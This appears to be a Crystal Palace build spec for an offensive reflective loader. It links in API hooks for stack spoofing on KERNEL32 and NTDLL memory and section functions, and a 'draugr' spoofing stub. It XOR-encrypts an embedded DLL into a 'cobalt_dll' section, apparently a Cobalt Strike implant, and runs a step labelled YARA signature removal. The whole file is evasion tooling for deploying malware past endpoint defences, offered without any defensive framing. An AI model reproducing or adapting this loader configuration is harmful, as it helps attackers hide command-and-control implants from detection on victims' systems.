x64:
	load "../bin/loader.x64.o"
		make pic +gofirst
	mergelib "../Crystal-palace/libtcg.x64.zip"
	dfr "resolve" "ror13"

	load "../bin/hooks.x64.o"
        merge
    
    load "../bin/spoof.x64.o"
        merge

    load "../bin/draugr.x64.bin"
        linkfunc "draugr_stub"

	# Hooked functions for stack spoofing
	attach "KERNEL32$CreateFileW"         "_CreateFileW"
    attach "KERNEL32$CloseHandle"         "_CloseHandle"
    attach "KERNEL32$VirtualAlloc"        "_VirtualAlloc"
    attach "KERNEL32$VirtualProtect"      "_VirtualProtect"
    attach "NTDLL$NtCreateSection"        "_NtCreateSection"
    attach "NTDLL$NtMapViewOfSection"     "_NtMapViewOfSection"
    attach "NTDLL$NtClose"                "_NtClose"
    attach "NTDLL$memset"                 "_memset"
    attach "NTDLL$memcpy"                 "_memcpy"
	attach "KERNEL32$LoadLibraryA"        "_LoadLibraryA"
    attach "KERNEL32$VirtualFree"         "_VirtualFree"

	preserve "KERNEL32$LoadLibraryA" "init_frame_info"

    # Generate XOR mask for EXE encryption
    generate $MASK 128

	# Embed EXE binary into cobalt_dll section
	push $DLL
        xor $MASK
        preplen
		link "cobalt_dll"
	
    # Embed XOR mask into cobalt_mask section
    push $MASK
        preplen
        link "cobalt_mask"
    
    # Apply YARA signature removal
    run "yara.spec"

	export
